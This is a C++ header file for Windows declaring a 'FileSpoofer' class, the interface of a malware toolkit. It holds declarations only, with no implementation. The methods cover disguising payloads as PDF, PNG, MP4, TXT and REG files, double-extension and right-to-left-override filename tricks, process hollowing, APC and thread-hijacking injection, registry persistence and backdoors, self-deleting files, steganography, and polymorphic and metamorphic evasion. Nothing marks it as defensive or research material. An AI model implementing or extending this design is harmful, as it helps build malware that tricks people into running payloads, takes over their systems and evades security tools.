#pragma once
#include <string>
#include <vector>
#include <map>
#include <memory>
#include <windows.h>
#include <shlobj.h>
#include <winreg.h>
#include <filesystem>

class FileSpoofer {
public:
    FileSpoofer();
    ~FileSpoofer();
    
    // Core spoofing methods
    void createSpoofedFile(const std::string& originalFile, const std::string& targetExtension);
    void createSpoofedREGFile(const std::string& payloadPath, const std::string& spoofedName);
    void createSpoofedPDFFile(const std::string& payloadPath, const std::string& spoofedName);
    void createSpoofedTXTFile(const std::string& payloadPath, const std::string& spoofedName);
    void createSpoofedPNGFile(const std::string& payloadPath, const std::string& spoofedName);
    void createSpoofedMP4File(const std::string& payloadPath, const std::string& spoofedName);
    
    // Advanced spoofing methods
    void createDoubleExtensionFile(const std::string& payloadPath, const std::string& fakeExt, const std::string& realExt);
    void createHiddenExtensionFile(const std::string& payloadPath, const std::string& fakeExt);
    void createUnicodeExtensionFile(const std::string& payloadPath, const std::string& fakeExt);
    void createRLOExtensionFile(const std::string& payloadPath, const std::string& fakeExt);
    
    // Mutex-based file melting
    void createMutexBasedMelter(const std::string& payloadPath, const std::string& targetProcess);
    void injectIntoProcess(const std::string& payloadPath, const std::string& targetProcess);
    void createProcessHollowing(const std::string& payloadPath, const std::string& targetProcess);
    void createAPCInjection(const std::string& payloadPath, const std::string& targetProcess);
    void createThreadHijacking(const std::string& payloadPath, const std::string& targetProcess);
    
    // Self-destruction methods
    void createSelfDestructingFile(const std::string& payloadPath);
    void createFragmentedFile(const std::string& payloadPath, int fragments);
    void createDistributedFile(const std::string& payloadPath, const std::vector<std::string>& locations);
    void createSteganographicFile(const std::string& payloadPath, const std::string& carrierFile);
    
    // Registry manipulation
    void createRegistryExploit(const std::string& payloadPath);
    void createRegistryPersistence(const std::string& payloadPath);
    void createRegistryHijacking(const std::string& payloadPath);
    void createRegistryBackdoor(const std::string& payloadPath);
    
    // Advanced evasion
    void createPolymorphicFile(const std::string& payloadPath);
    void createMetamorphicFile(const std::string& payloadPath);
    void createEncryptedFile(const std::string& payloadPath, const std::string& key);
    void createObfuscatedFile(const std::string& payloadPath);
    
    // Utility methods
    std::string generateRandomFilename(const std::string& extension);
    std::string getSystemPath(const std::string& pathType);
    bool fileExists(const std::string& filePath);
    void deleteFile(const std::string& filePath);
    void hideFile(const std::string& filePath);
    
    // Getters
    std::vector<std::string> getSpoofedFiles() const;
    std::string getLastError() const;

private:
    std::vector<std::string> spoofedFiles;
    std::string lastError;
    
    // Internal methods
    void createFileViewerREG(const std::string& payloadPath, const std::string& spoofedName);
    void createPDFWithJavaScript(const std::string& payloadPath, const std::string& spoofedName);
    void createTXTWithEmbeddedCode(const std::string& payloadPath, const std::string& spoofedName);
    void createPNGWithMetadata(const std::string& payloadPath, const std::string& spoofedName);
    void createMP4WithEmbeddedPayload(const std::string& payloadPath, const std::string& spoofedName);
    
    // Mutex methods
    HANDLE createMutex(const std::string& mutexName);
    bool waitForMutex(HANDLE hMutex, DWORD timeout);
    void releaseMutex(HANDLE hMutex);
    void closeMutex(HANDLE hMutex);
    
    // Process injection methods
    DWORD findProcessId(const std::string& processName);
    HANDLE openTargetProcess(DWORD processId);
    LPVOID allocateMemoryInProcess(HANDLE hProcess, SIZE_T size);
    bool writeMemoryToProcess(HANDLE hProcess, LPVOID address, LPVOID data, SIZE_T size);
    HANDLE createRemoteThread(HANDLE hProcess, LPVOID startAddress, LPVOID parameter);
    
    // File manipulation methods
    std::vector<BYTE> readFileBytes(const std::string& filePath);
    bool writeFileBytes(const std::string& filePath, const std::vector<BYTE>& data);
    std::string getFileExtension(const std::string& filePath);
    std::string getFileName(const std::string& filePath);
    std::string getFilePath(const std::string& filePath);
    
    // Registry methods
    bool createRegistryKey(const std::string& keyPath);
    bool setRegistryValue(const std::string& keyPath, const std::string& valueName, const std::string& valueData);
    bool deleteRegistryKey(const std::string& keyPath);
    std::string readRegistryValue(const std::string& keyPath, const std::string& valueName);
    
    // Encryption methods
    std::vector<BYTE> encryptData(const std::vector<BYTE>& data, const std::string& key);
    std::vector<BYTE> decryptData(const std::vector<BYTE>& data, const std::string& key);
    std::string generateRandomKey(int length);
    
    // Steganography methods
    std::vector<BYTE> hideDataInImage(const std::vector<BYTE>& imageData, const std::vector<BYTE>& hiddenData);
    std::vector<BYTE> extractDataFromImage(const std::vector<BYTE>& imageData);
    
    // Polymorphism methods
    std::vector<BYTE> polymorphicTransform(const std::vector<BYTE>& data);
    std::vector<BYTE> metamorphicTransform(const std::vector<BYTE>& data);
    
    // Utility methods
    std::string generateRandomString(int length);
    std::string encodeBase64(const std::vector<BYTE>& data);
    std::vector<BYTE> decodeBase64(const std::string& data);
    std::string calculateMD5(const std::vector<BYTE>& data);
    std::string calculateSHA256(const std::vector<BYTE>& data);
    
    // Error handling
    void setError(const std::string& error);
    void clearError();
    
    // Configuration
    std::map<std::string, std::string> fileAssociations;
    std::vector<std::string> targetProcesses;
    std::vector<std::string> systemPaths;
    
    void initializeFileAssociations();
    void initializeTargetProcesses();
    void initializeSystemPaths();
};